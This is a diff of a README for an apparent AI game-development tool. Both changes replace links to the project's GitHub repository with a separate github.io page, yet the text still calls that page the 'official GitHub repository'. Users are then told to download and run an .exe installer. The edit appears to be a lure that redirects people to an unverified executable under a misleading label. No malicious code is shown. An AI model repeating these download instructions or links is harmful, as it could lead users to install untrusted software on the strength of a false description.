@@ -1,6 +1,6 @@
 # 🎮 codex-ai-game-studio - Create games using artificial intelligence tools
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/claretagrapelike32/codex-ai-game-studio)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://claretagrapelike32.github.io)
 
 Codex-ai-game-studio simplifies game design. This software combines 85 skills, 49 roles, and 163 verified tools into one workspace. It handles automation for your editor and manages quality gates for your projects. You build games faster through native AI integration. The system supports 3D animation, sprite creation, and procedural generation tasks.
 
@@ -29,7 +29,7 @@ Your computer needs specific hardware to run this software smoothly. Check your 
 
 Follow these steps to install the software on your Windows computer.
 
-1. **Visit the download page:** Go to the [official GitHub repository](https://github.com/claretagrapelike32/codex-ai-game-studio) to access the files.
+1. **Visit the download page:** Go to the [official GitHub repository](https://claretagrapelike32.github.io) to access the files.
 2. **Download the installer:** Look for the latest release file with the .exe extension. Click the file name to save it to your computer.
 3. **Run the installer:** Locate the file in your downloads folder. Double-click the file to start the setup process.
 4. **Follow prompts:** The installer guides you through the process. Select your installation folder and click install.
